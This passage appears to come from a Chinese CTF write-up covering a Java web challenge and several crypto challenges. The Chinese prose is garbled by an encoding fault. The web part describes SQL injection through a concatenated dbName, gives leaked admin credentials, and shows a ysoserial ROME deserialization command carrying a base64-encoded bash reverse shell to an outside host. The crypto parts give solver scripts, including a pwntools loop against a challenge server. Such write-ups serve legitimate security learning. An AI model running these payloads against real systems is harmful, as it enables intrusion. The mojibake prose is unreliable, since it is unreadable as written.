class="keyword">try</span> &#123;</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    DatabaseMetaData metaData = conn.getMetaData();</span><br><span class="line">    ResultSet tableNames = metaData.getTables((String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;TABLE&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">while</span> (tableNames.next()) &#123;</span><br><span class="line">      TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">      Table table = <span class="keyword">new</span> Table();</span><br><span class="line">      String sql = <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">      ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">      <span class="keyword">while</span> (rs.next())</span><br><span class="line">        table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>)); </span><br><span class="line">      table.setTableName(TableName);</span><br><span class="line">      ResultSet data = metaData.getColumns(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName);</span><br><span class="line">      String PK;</span><br><span class="line">      <span class="keyword">for</span> (PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>));</span><br><span class="line">      <span class="keyword">while</span> (data.next()) &#123;</span><br><span class="line">        Row row = <span class="keyword">new</span> Row(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="keyword">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">        table.list.add(row);</span><br><span class="line">      &#125; </span><br><span class="line">      Tables.add(table);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">    var16.printStackTrace();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> Tables;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰æ³¨å…¥çš„æ ·å­ï¼ŒæŠŠdbnameæ‹¼æ¥åˆ°äº†è¯­å¥é‡Œã€‚</p><p>åº”è¯¥æ˜¯æ³¨å…¥å‡ºç”¨æˆ·åå¯†ç ï¼Œç„¶åç™»é™†ï¼Œç™»é™†åé¢è¿˜æœ‰é¢˜ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ dbnameéœ€è¦æ­£ç¡®è¿æ¥ï¼ŒåŒæ—¶è¿˜è¦æ³¨å…¥ï¼Œå¯ä»¥ç”¨#æˆªæ–­ä½¿jdbcæ­£å¸¸è¿æ¥ï¼Œç„¶åæ³¨å…¥payloadæ”¾åˆ°åé¢ã€‚</p><p>å¯ä»¥æ³¨å…¥å‡ºç”¨æˆ·åå’Œå¯†ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-002248aa671587e7.png" alt="image.png"></p><p>ç”¨æˆ·åæ˜¯ adminï¼Œå¯†ç æ˜¯admin@Rrrr_ctf_asdeã€‚</p><p>ç™»é™†ï¼Œå‘ç°ç»™äº†ä¸ªtokenã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-bc25eb7e982fffd3.png" alt="image.png"></p><p>Beareråé¢éƒ¨åˆ†æ˜æ˜¾æ˜¯åºåˆ—åŒ–æ•°æ®çš„base64ç¼–ç ï¼Œè¿˜æœ‰ä¸ªcurrentæ¥å£ï¼Œæˆ‘ä»¬æŠŠtoken postè¿‡å»ï¼Œå‘ç°æ ¡éªŒæˆåŠŸã€‚</p><p>æ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œcurrentä¼šååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦ getshellï¼Œä½†æ˜¯æ²¡æœ‰gadgetã€‚ã€‚ã€‚</p><p>æ¯”èµ›çš„æ—¶å€™å¡åœ¨äº†è¿™é‡Œã€‚ã€‚ã€‚æœ¬æ¥è¿™ä¸ªé¢˜æ”¾å‡ºæ¥ä¸€é˜µå­éƒ½åªæœ‰3ä¸ªé˜Ÿåšå‡ºæ¥ï¼Œåæ¥çªç„¶å°±å‡ åæ”¯äº†ï¼Œä½›äº†ã€‚</p><p>èµ›åé—®äº†ä¸€æ³¢ï¼Œè²Œä¼¼æ˜¯ç”¨ysoserialæŒ¨ä¸ªexpæ‰“ï¼Ÿ</p><p>ysoserial æ˜¯ä¸ªé›†æˆäº†javaååºåˆ—åŒ–expçš„å·¥å…·ï¼Œgithubåœ¨è¿™é‡Œï¼š<a href="https://github.com/frohoff/ysoserialã€‚">https://github.com/frohoff/ysoserialã€‚</a></p><p>è¿™ä¸ªé¢˜æ˜¯ç”¨ ROME æ‰“çš„ï¼Œé¦–å…ˆä¸‹è½½ysoserialæ–‡ä»¶ï¼Œå› ä¸ºjava åå¼¹shellå®¹æ˜“å‡ºé—®é¢˜ï¼Œæ‰¾äº†ä¸ªåœ¨çº¿ç½‘ç«™æ”¹ä¸€ä¸‹payloadï¼š<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-5d91acf48a023ca4.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar ROME <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MTc4LTg5N2VhMDQwLTU2YzAtNDg2NC04NWM1LWE4YWY4ZmJjMmY4ZS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> | base64</span><br></pre></td></tr></table></figure><p>æŠŠç”Ÿæˆçš„base64ï¼Œcurrentæ¥å£å‘è¿‡å»ï¼ˆè®°å¾—å‰é¢åŠ Bearerã€‚ã€‚å› ä¸ºæ²¡åŠ Beareræ‰¾äº†åŠå¤©é—®é¢˜orzï¼‰</p><p>å¯ä»¥å¼¹åˆ°shellï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0fd81c5d04ad08c1.png" alt="image.png"></p><p>é¡ºä¾¿è¯´ä¸€å¥ï¼Œå¦‚æœæ‰“ä¸æˆï¼Œå¯ä»¥è¯•ç€å…ˆç”¨ysoserialçš„URLDNSæ¨¡å—æµ‹è¯•ååºåˆ—åŒ–æ˜¯å¦å¯ä»¥ç”¨ï¼Œå…ˆæŠŠURLDNSæ‰“æˆã€‚</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h3><p>ä»¿å°„å¯†ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;kgws&#123;m8u8cm65-ue9k-44k5-8361-we225m76eeww&#125;&quot;</span></span><br><span class="line">k1 = <span class="number">123456</span> % <span class="number">26</span></span><br><span class="line">k2 = <span class="number">321564</span> % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        flag += c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            <span class="keyword">if</span> (k1 * (<span class="built_in">ord</span>(m) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + k2) % <span class="number">26</span> == <span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">                flag += m</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="RUA"><a href="#RUA" class="headerlink" title="RUA"></a>RUA</h3><p>ä¸‰ç»„nä¸cï¼Œæ²¡æœ‰eï¼Œnéƒ½å¾ˆå¤§ï¼Œç›¸äº’äº’ç´ ã€‚</p><p>è€ƒè™‘ä¸­å›½å‰©ä½™å®šç†ï¼Œç„¶åå¼€ä¸‰æ¬¡æ–¹ï¼Œå¼€ä¸å‡ºæ¥ã€‚Næœ‰å¤§çº¦6000å¤šbitï¼Œçˆ†ç ´eå¼€æ–¹ï¼Œå‘ç°æ˜¯17æ¬¡æ–¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="comment"># mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(è§£,æœ€å°å…¬å€æ•°)</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">18856599160001833299560082802925753595735945621023660831294740454109973698430284916320395522883536507135735383517926050963512440162483065097256884040938259092582892259657340825971260278387406398529168309426241530551396056450450728728601248269612166083300938497235910244979946020059799495231539400114422748104072550004260736766137354572252872437140063474603268146956570787143010441293268321641092743010805639953103578977668248726500636191043930770036787317928372179939360510179438436665591755940224156131460271763912868322774604558314812111335691108887319827579162188169744014973478052491398688611046800951698773893393</span></span><br><span class="line">c1 = <span class="number">8024667293310019199660855174436055144348010556139300886990767145319919733369837206849070207955417356957254331839203914525519504562595117422955140319552013305532068903324132309109484106720045613714716627620318471048195232209672212970269569790677144450501305289670783572919282909796765124242287108717189750662740283813981242918671472893126494796140877412502365037187659905034193901633516360208987731322599974612602945866477752340080783296268396044532883548423045471565356810753599618810964317690395898263698123505876052304469769153374038403491084285836952034950978098249299597775306141671935146933958644456499200221696</span></span><br><span class="line">c2 = <span class="number">17388575106047489057419896548519877785989670179021521580945768965101106268068805843720622749203590810185213416901978773748832854888898576822477243682874784689127705334243899967896321836688567602323551986980634884700045627950473546069670440078998428940082620044462222475031805594211784370238038168894827559017562364252406425134530719911057780692073760058203345936344269833206906999625580911856011564697811258009937314511410514416706482571471852503756675411177080916350899445106002226392895645443215522671155311715637759618276305217468892076287376401516124640727839779731609203202530346427613422430202271506248285086956</span></span><br><span class="line">n2 = <span class="number">21996468204721630460566169654781925102402634427772676287751800587544894952838038401189546149401344752771866376882226876072201426041697882026653772987648569053238451992877808811034545463363146057879646485465730317977739706776287970278094261290398668538232727000322458605289913900919015380904209692398479885177984131014170652915222062267448446642158394150657058846328033404309210836219241651882903083719822769947131283541299760283547938795574020478852839044803553093825730447126796668238131579735916546235889726257184058908852902241422169929720898025622336508382492878690496154797198800699611812166851455110635853297883</span></span><br><span class="line">c3 = <span class="number">5170826942130658374627267470548549396328896108666717036999395626588154882531377393671593939192779292151584678688653835775920356845071292462816417186595460417761844407911946323815187102170021222644920874070699813549492713967666736815947822200867353461264579419205756500926218294604616696969184793377381622818381733352202456524002876336304465082656612634304327627259494264840838687207529676882041997761204004549052900816658341867989593333356630311753611684503882509990853456022056473296726728969894815574884063807804354952314391764618179147583447848871220103094864884798102542377747761263052887894135796051521881179607</span></span><br><span class="line">n3 = <span class="number">22182114562385985868993176463839749402849876738564142471647983947408274900941377521795379832791801082248237432130658027011388009638587979450937703029168222842849801985646044116463703409531938580410511097238939431284352109949200312466658018635489121157805030775386698514705824737070792739967925773549468095396944503293347398507980924747059180705269064441084577177316227162712249300900490014519213102070911105044792363935553422311683947941027846793608299170467483012199132849683112640658915359398437290872795783350944147546342693285520002760411554647284259473777888584007026980376463757296179071968120796742375210877789</span></span><br><span class="line"></span><br><span class="line">m =  GCRT([n1,n2,n3],[c1,c2,c3])[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    flag = long_to_bytes(gmpy2.iroot(m,e)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><h3 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h3><p>éœ€è¦è§£å‡ºå‰é¢çš„æ–¹ç¨‹ï¼Œå¾—åˆ°ç¬¬7ä¸ªdï¼Œæ‰å¯ä»¥æœ‰å¾—åˆ°åé¢10ä¸ªè¾“å‡ºçš„æœºä¼šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = getPrime(<span class="number">64</span>)</span><br><span class="line">b = getPrime(<span class="number">64</span>)</span><br><span class="line">c = getPrime(<span class="number">64</span>)</span><br><span class="line">d = <span class="built_in">int</span>(urandom(<span class="number">8</span>).encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    d = (d * a + c) % b</span><br><span class="line">    code.append(d)</span><br></pre></td></tr></table></figure><p>ç»™äº†å‰å…­ä¸ªdï¼Œéœ€è¦æ±‚å‡ºç¬¬ä¸ƒä¸ªdã€‚è§£æ–¹ç¨‹æ¯”è¾ƒéº»çƒ¦åœ¨äºbæ˜¯æ¨¡æ•°å¹¶ä¸”æœªçŸ¥ã€‚</p><p>å‚è€ƒ<a href="https://math.stackexchange.com/questions/1861606/solving-linear-congruences-with-unknown-modulusã€‚">https://math.stackexchange.com/questions/1861606/solving-linear-congruences-with-unknown-modulusã€‚</a></p><p>æˆ‘ä»¬ç›®å‰æ‹¥æœ‰5ä¸ªæ–¹ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x1*a + c &#x3D; x2 mod b</span><br><span class="line">x2*a + c &#x3D; x3 mod b</span><br><span class="line">x3*a + c &#x3D; x4 mod b</span><br><span class="line">x4*a + c &#x3D; x5 mod b</span><br><span class="line">x5*a + c &#x3D; x6 mod b</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ€è·¯å°±æ˜¯é€šè¿‡ç­‰å¼ç›¸å‡ï¼Œå¾—åˆ°ä¸€äº› x*a=y mod bçš„æ–¹ç¨‹ï¼Œç„¶åæŒ‘ä¸¤ä¸ªäº’ç´ çš„xä½œä¸ºåŸºåº•ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªå¼å­æ„é€ å‡º a=m mod bï¼Œå†ä»»æ„æŒ‘é€‰ä¸€ x0*a=y0 mod bï¼Œå¾—åˆ°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m*x0&#x3D;y0 mod b</span><br></pre></td></tr></table></figure><p>å¾—åˆ° b|(m*x2-y2)ï¼Œå†åˆ†è§£bï¼Œæ‰¾å‡ºå…¶ä¸­çš„64bitçš„ç´ æ•°ï¼Œå°±è¿˜åŸäº†bã€‚è¿˜åŸbåaå’Œcå°±å¥½ç®—äº†ã€‚</p><p>ç„¶åæœ‰åæ¬¡æœºä¼šçŒœæ•°ï¼Œgameå…¶å®æ˜¯ä¸ª39bitçš„lfsrï¼Œåˆæ€ä¸keyæœªçŸ¥ï¼Œéœ€è¦78bitè¿˜åŸï¼Œæ­£å¸¸æƒ…å†µä¸‹å¾—åˆ°78bitéœ€è¦åä¸ªæ•°ï¼Œä½†æ˜¯åä¸ªæ•°é”™è¯¯åç›´æ¥é€€å‡ºäº†ï¼Œæ‰€ä»¥éœ€è¦çŒœåæ¬¡çš„è¿‡ç¨‹ä¸­ï¼ŒçŒœå¯¹ä¸€ä¸ªã€‚ï¼ˆå†™ä¸ªå¾ªç¯çˆ†ç ´ï¼‰</p><p>æ¦‚ç‡æ˜¯ <code>1-(255/256)^10</code>ï¼Œå¤§çº¦æ˜¯ 3%ã€‚</p><p>çŒœå¯¹åï¼Œå¯ä»¥æ ¹æ®78bitè¿˜åŸåˆæ€ä¸keyï¼Œå’Œå»å¹´de1ctfçš„æ€è·¯ä¸€æ ·ï¼Œè§£æ–¹ç¨‹ç»„å°±å¥½äº†ï¼Œé«˜æ–¯æ¶ˆå…ƒæ³•ï¼Œå¯ä»¥å‚è€ƒ<a href="http://igml.top/2019/08/04/2019-de1ctf/#babylfsr">http://igml.top/2019/08/04/2019-de1ctf/#babylfsr</a></p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, key, r, b</span>):</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.key = key</span><br><span class="line">        self.r = r &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.b = b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">out</span>(<span class="params">self</span>):</span></span><br><span class="line">        o = self.r &amp; <span class="number">1</span></span><br><span class="line">        p = self.r &amp; self.key</span><br><span class="line">        q = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            q = q + p &amp; <span class="number">1</span></span><br><span class="line">            p = p &gt;&gt; <span class="number">1</span></span><br><span class="line">        q = q &amp; <span class="number">1</span></span><br><span class="line">        t = q &lt;&lt; (self.n - <span class="number">2</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.r = t | (self.r &gt;&gt; <span class="number">1</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.b):</span><br><span class="line">            o = self.out()</span><br><span class="line">            res |= o &lt;&lt; (self.b - <span class="number">1</span> - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> y, x - a / b * y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>(<span class="params">stream</span>):</span></span><br><span class="line">    dim = <span class="number">39</span></span><br><span class="line">    left, right = stream[:<span class="number">39</span>], stream[<span class="number">39</span>:]</span><br><span class="line">    magic = [<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(right[:i][::<span class="number">-1</span>] + left[:(<span class="number">39</span> - i)])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>)]</span><br><span class="line">    cipher = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(right))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher) == <span class="number">39</span></span><br><span class="line">    <span class="comment"># é«˜æ–¯æ¶ˆå…ƒ</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j, dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span>:</span><br><span class="line">                magic[i], magic[j] = magic[j], magic[i]</span><br><span class="line">                cipher[i], cipher[j] = cipher[j], cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span> <span class="keyword">and</span> i != j:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                    magic[i][k] ^= magic[j][k]</span><br><span class="line">                cipher[i] ^= cipher[j]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, cipher)), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;59.110.243.101&#x27;</span>, <span class="number">5123</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    n = []</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Baby:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Easy:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Normal:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Hard:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Master:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span 